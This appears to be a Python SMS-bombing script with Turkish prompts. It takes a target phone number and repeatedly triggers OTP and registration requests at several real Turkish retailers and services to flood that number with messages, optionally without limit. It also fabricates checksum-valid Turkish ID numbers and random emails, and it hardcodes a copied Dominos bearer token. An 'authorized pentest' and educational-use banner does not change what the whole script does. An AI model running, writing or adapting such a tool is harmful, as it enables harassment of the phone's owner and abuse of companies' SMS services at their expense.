#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests, os, time, sys
from random import choice, randint
from string import ascii_lowercase

G='\033[92m'; R='\033[91m'; B='\033[94m'; W='\033[97m'; S='\033[0m'; X='\033[93m'
adet=0

class SMS:
    def __init__(s, phone, mail=None):
        s.phone=phone; tc=[str(randint(1,9))]+[str(randint(0,9)) for _ in range(8)]
        tc.append(str(((int(tc[0])+int(tc[2])+int(tc[4])+int(tc[6])+int(tc[8]))*7-(int(tc[1])+int(tc[3])+int(tc[5])+int(tc[7])))%10))
        tc.append(str((sum(int(x) for x in tc))%10)); s.tc=''.join(tc)
        s.mail=mail or (''.join(choice(ascii_lowercase) for _ in range(22))+'@gmail.com')
    
    def gonder(s,ad,url,j,h,bk):
        global adet
        try:
            r=requests.post(url,json=j,headers=h,timeout=8)
            if bk(r):
                adet+=1; print(f'{G}[+] {S}{ad} -> {s.phone}')
            else: print(f'{R}[-] {S}{ad}')
        except: print(f'{R}[-] {S}{ad}')
    
    def Kahve(s): s.gonder('KahveDunyasi','https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number',{"countryCode":"90","phoneNumber":s.phone},{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.kahvedunyasi.com"},lambda r:r.json().get("processStatus")=="Success")
    def Bim(s): s.gonder('BIM','https://bim.veesk.net/service/v1.0/account/login',{"phone":s.phone},{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.bim.com.tr"},lambda r:r.status_code==200)
    def File(s): s.gonder('FileMarket','https://api.filemarket.com.tr/v1/otp/send',{"mobilePhoneNumber":f"90{s.phone}"},{"User-Agent":"filemarket/1 CFNetwork","Content-Type":"application/json"},lambda r:r.json().get("responseType")=="SUCCESS")
    def Dominos(s): s.gonder('Dominos','https://frontend.dominos.com.tr/api/customer/sendOtpCode',{"email":s.mail,"isSure":False,"mobilePhone":s.phone},{"Content-Type":"application/json","User-Agent":"Dominos/7.1.0 CFNetwork","Authorization":"Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg"},lambda r:r.json().get("isSuccess")==True)
    def Porty(s): s.gonder('Porty','https://panel.porty.tech/api.php',{"job":"start_login","phone":s.phone},{"User-Agent":"Porty/1 CFNetwork","Content-Type":"application/json"},lambda r:r.status_code==200)
    def Evidea(s):
        try:
            b='--x\r\n'; hdrs={"User-Agent":"Evidea/1 CFNetwork","Content-Type":"multipart/form-data; boundary=x"}
            d=b+'content-disposition: form-data; name="first_name"\r\n\r\nTest\r\n'+b+'content-disposition: form-data; name="last_name"\r\n\r\nUser\r\n'+b+'content-disposition: form-data; name="email"\r\n\r\n'+s.mail+'\r\n'+b+'content-disposition: form-data; name="password"\r\n\r\nTest123..abc\r\n'+b+'content-disposition: form-data; name="phone"\r\n\r\n0'+s.phone+'\r\n'+b+'content-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n'+b+'content-disposition: form-data; name="email_allowed"\r\n\r\nfalse\r\n'+b+'content-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--x--'
            r=requests.post('https://www.evidea.com/users/register/',headers=hdrs,data=d,timeout=8)
            if r.status_code==202: global adet; adet+=1; print(f'{G}[+] {S}Evidea -> {s.phone}')
            else: print(f'{R}[-] {S}Evidea')
        except: print(f'{R}[-] {S}Evidea')

def saldir(tel,mail,sayi,aralik):
    s=SMS(tel,mail); sv=[s.Kahve,s.Bim,s.File,s.Dominos,s.Porty,s.Evidea]
    while sayi is None or adet<sayi:
        for fn in sv:
            if sayi is not None and adet>=sayi: return
            fn()
            if aralik: time.sleep(aralik)

if __name__=='__main__':
    os.system('cls' if os.name=='nt' else 'clear')
    print(G+"""
     ___                                             __
   / (_)___  __  ___  ___________ ___  ______ _____/ /
  / / / __ \\/ / / / |/_/ ___/ __ `/ / / / __ `/ __  / 
 / / / / / / /_/ />  <(__  ) /_/ / /_/ / /_/ / /_/ /  
/_/_/_/ /_/\\__,_/_/|_/____/\\__, /\\__,_/\\__,_/\\__,_/   
                             /_/ (authorized pentest)
"""+S)
    print(f'{G}[i]{S} linuxsquadSMS - Egitim Amacli Pentest Araci\n')
    try:
        tel=input(f'{W}Hedef Numara (0siz 10 hane): {G}')
        if len(tel)!=10 or not tel.isdigit(): print(f'{R}Hatali numara!{S}'); sys.exit(1)
        mail=input(f'{W}Mail (enter=rastgele): {G}').strip()
        sayi=input(f'{W}SMS Sayisi (enter=sinirsiz): {G}').strip()
        sayi=int(sayi) if sayi else None
        aralik=input(f'{W}Aralik saniye (0=hizli): {G}').strip()
        aralik=float(aralik) if aralik else 0
        print(f'\n{B}[!] Hedef: {tel} | Adet: {sayi or "SINIRSIZ"} | Basliyor...{S}\n')
        saldir(tel,mail,sayi,aralik)
        print(f'\n{G}[+] Tamamlandi! Toplam: {adet} SMS{S}')
        input(f'\n{W}Devam icin Enter...{S}')
    except KeyboardInterrupt: print(f'\n{X}[!] Durduruldu. Gonderilen: {adet}{S}')
    except Exception as e: print(f'{R}[!] Hata: {e}{S}')
